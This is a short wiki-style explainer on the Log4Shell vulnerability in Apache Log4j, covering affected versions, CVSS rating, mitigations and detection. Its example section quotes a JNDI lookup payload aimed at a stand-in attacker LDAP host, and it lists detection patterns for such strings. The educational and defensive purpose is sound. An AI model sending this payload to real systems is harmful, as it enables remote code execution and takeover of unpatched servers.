# Log4j

## What it is
Imagine a hotel's guest registry that, instead of just recording names, executes any instruction written in the guest book — including "go unlock room 401." Log4Shell (CVE-2021-44228) is a critical Remote Code Execution vulnerability in Apache Log4j, a widely used Java logging library, where attackers embed malicious JNDI lookup strings in logged inputs and the library fetches and executes attacker-controlled code from a remote server.

## Why it matters
In December 2021, attackers exploited Log4Shell against VMware Horizon servers by sending a crafted HTTP User-Agent header containing `${jndi:ldap://attacker.com/exploit}`. The server logged the string, Log4j processed the JNDI lookup, connected to the attacker's LDAP server, and downloaded a malicious Java class — granting full remote access with zero authentication required.

## Key facts
- **CVE-2021-44228** affects Log4j versions **2.0-beta9 through 2.14.1**; the fix landed in **2.15.0** (later hardened in 2.17.0).
- The attack vector is **CVSS 10.0 (Critical)** — network-exploitable, no privileges needed, no user interaction.
- The payload abuses **JNDI (Java Naming and Directory Interface)** with LDAP, RMI, or DNS to trigger outbound connections and code execution.
- Mitigations include: patching to Log4j ≥2.17.1, setting `log4j2.formatMsgNoLookups=true`, blocking outbound LDAP/RMI at the firewall, and deploying WAF rules to detect `${jndi:` patterns.
- Detection relies on hunting for outbound DNS/LDAP requests from application servers and scanning logs for `${` patterns in user-supplied fields.

## Related concepts
[[Remote Code Execution]] [[JNDI Injection]] [[CVE Scoring (CVSS)]] [[Web Application Firewall]] [[Patch Management]]